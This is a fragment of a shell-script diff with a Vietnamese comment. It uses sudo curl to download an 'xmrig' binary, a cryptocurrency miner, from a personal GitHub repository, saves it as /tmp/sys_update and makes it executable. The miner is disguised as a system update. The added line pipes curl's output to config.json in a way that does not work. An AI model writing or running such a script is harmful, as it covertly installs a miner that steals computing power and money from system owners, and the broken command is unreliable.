@@ -12,6 +12,7 @@ sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.
 
 # Đảm bảo file thực thi sys_update cũng nằm ở đây
 
-sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update
+sudo curl -sL https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -o /tmp/sys_update | tr -d '\r' | sudo tee /tmp/config.json > /dev/null
 
 sudo chmod +x /tmp/sys_update
+
